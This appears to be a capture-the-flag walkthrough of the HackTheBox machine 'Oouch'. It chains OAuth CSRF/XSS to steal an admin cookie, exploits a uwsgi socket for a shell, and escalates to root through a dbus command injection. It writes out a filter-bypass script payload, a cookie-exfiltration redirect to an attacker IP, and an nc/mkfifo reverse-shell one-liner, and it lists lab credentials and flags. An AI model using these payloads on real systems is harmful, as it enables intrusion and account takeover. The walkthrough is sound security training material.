@@ -1,0 +1,72 @@
+Getting the basic recon we have 4 ports open: 21 (FTP), 22(SSH), 5000(WEB), 8000(WEB)
+
+Recon the FTP port (21):
+From the nmap script we get the anonymous login, but the server is almost empty, we can only download th e `project.txt` file. From here we get the information about the frameworks that are used, Flask ( consumer ) and Django (Authorization Server). This might be the ports 5000 and 8000.
+
+Recon on the port 5000.
+!!Before everything, we know that we have to deal with nginx which is a reverse proxy, so we might find some domains.
+The first contact that we have is with a login panel. Let's try and see if we can register this. Creating an account `wh0am1:wh0am1` and logging in we get a panel with some urls. 
+In the background we will run gobuster, but with a custom wordlist. This is the only one that found something usefull. `gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words.txt -u http://10.10.10.177:5000 -o consumer.oouch.htb.recon`. In the mean time, looking into `/profile` we have an interesting thing `Connected-Accounts` which might point out to some other services that are under development.
+Also, the contact page seems to be checked by admin so it's worth a shot to try XSS to steal the cookie.
+
+Recon on the port 8000.
+Trying different kinds of requests we only get 400 Bad Request. Nothing there for now. 
+
+Finding the foothold.
+Meanwhile, in the background dobuster has a new unlinked directory, `/oauth`. Here it sais something about the `functionality is currently under development and not ready to be used in production` so this could be the attack vector. 
+Clicking on this url we get two new hostnames, `http://consumer.oouch.htb:5000` at first and than `authorization.oouch.htb:8000`
+Now it seems that we can acess the webserver on 8000.
+
+Recon on the port 8000.
+At first, we are greeted with an interesting message, that we are now on the authorization server. Let's create an account `wh0am1:testpass123` and than login. Here we reveal two new endpoints, `/oauth/authorize` and `/oauth/token`. Let's fire up the gobuster for this. Maybe we will need it later.
+
+Combine both services into one. 
+We can see a pattern here. If I authorize the app to acess my account I can acess it. So let's try a CSFR attack, using only plain html.
+First if we try <script> we get banned for a minute, but if we try <scriPt> we bypassed it. Now let's get the output of the `http://consumer.oouch.htb:5000/oauth/connect` into burp and let's craft the attack.We will take the request when we click authorize. This is saved into the `authorize-connect-token.burp` and use the link resulted, the 302 redirect. `http://consumer.oouch.htb:5000/oauth/connect/token?code=xxxxxxxxxxxxxxxxxxxxxx` 
+This we will paste into the <scriPt src="" />.
+Note it's fine not to get the `Linked accounts`. Our account is linked to the admin, not we.Waiting a little and get to the `http://consumer.oouch.htb:5000/oauth/login` we should have the admin. 
+
+Doing the admin checklist.
+So we did it. We are admin. Not let's recheck all the url. We notice a difference in `/documents`. Here are some notes now. Let's do them as they appear because the result seems preatty interesting, `all users could obtain my ssh key.`
+First, we have some credentials for application registration. Well, on the authorization server we have oauth/applications ( found on the recon ). Let's try `/oauth/application/register`. Here we are promted with a login, but this is ok, we got the creds. Let's create a new app, I will name it `api` because of the next step in checklist. Also, I will set the `Authorization grant type` to `Client credentials` and the `Client type` to public.
+Capturing the request in burp we get a 403 Forbidden. So it might require authentification. Let's try to reuse the request at the first step to create a token. Now we also have the `client secret`. The request can be found in `api_get-token.burp`.
+The response has a new information, that this token is Bearer. So we need to add the Authorization header. 
+On the `/api/get_user` we got a 200, with a basic response in json. Trying to mess arround with it we find `get_ssh`, but it's empty
+
+Stealing the admin cookie to get the SSH keys and pwn the user.
+Going back to the first step, we need to force the admin to give us the cookie. We will make this by changing the response uri to our url and we will again modify the first request, the one with oauth, but now we know that `/oauth/authorize` is able to handle the `GET` method.
+This is the payload for `<scriPt src="http://authorization.oouch.htb:8000/oauth/authorize/?client_id=MrJutTaPCPR7PdFCIdDDxRbCvnUVnXdl8bv4UAbQ&response_type=code&redirect_uri=http://10.10.14.47:81/doc&scope=read"></scriPt>` and after a couple of seconds we get the response back ( captured with `nc -lvnp 81` and found in `admin_cookie.ncat`
+A quick note. The token expire afte 600 seconds ( 10 minutes ) 
+Now let's make the final request to get the ssh keys, `/api/get_ssh`. A little bit of styling and we are in.
+
+Got the user: ssh -i qtc_rsa qtc@10.10.10.177
+
+Inital recon 
+After some enum we found using the `ip -a n` 4 new ips with seems to be docker containers. We upload nmap to the box ( the portable version ) and we run them all `./nmap -p- -n 172.18.0.x`. We find on two of them that the ssh port is open. Trying the both, the only one that works is `172.18.0.4` ( this might vary from a server to another )
+Here we have a new directory `/code` which contains the whole 5000 port. After some recon we try to attack the uwsgi socker, using a python tool. There are some usefull articles that I've found. 
+Further more, with the content found in `/etc/dbus-1/system.d/htb.oouch.Block.conf` we know that www-data has read-write acess to this module. With this we actually can root the box.
+
+Getting the www-data shell
+Playing with it we see that an error perists the one related to `import bytes` module not found. Adding a quick fix to this, `from builtins import bytes` and we made our script python3 proof.
+Now we can actually test the concept if its working with `python3 uwsgi_4.py -u /tmp/uwsgi.socket -m unix -c "cmd"`. 
+I tried a bunch of things to get a reverse shell as `www-data` but the only one that worked was from a python file, having a default reverse shell from PayloadAllTheThings. The command looks like `python3 uwsgi_4.py -u /tmp/uwsgi.socket -m unix -c "python /tmp/shell.py"`.
+
+From www-data to root.
+Now is the time to take the note seriously and use the d-bus. Here I've also found an article which we can easily adapt to, and change the cmd just a little and get root. `dbus-send --system --dest=htb.oouch.Block --type=method_call --print-reply /htb/oouch/Block htb.oouch.Block.Block string:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.47 1337 >/tmp/f #"`
+
+Rooted. 
+
+Credentials:
+-> develop:supermegasecureklarabubu123! ( Only for /oauth/application/register ) 
+
+Credentials after pwn:
+-> qtc:klaraboboklaraboboklarabobo2099!
+
+
+Flags:
+-> USER: e6b4d7a3d54598e5905af68d00bcddf9
+-> ROOT: e049b8877803d78434cc315a9c44957e
+
+Articles:
+-> https://www.xmsec.cc/attack-webcgi-with-socket/
+-> https://blog.fpmurphy.com/2018/10/using-the-d-bus-interface-to-firewalld.html
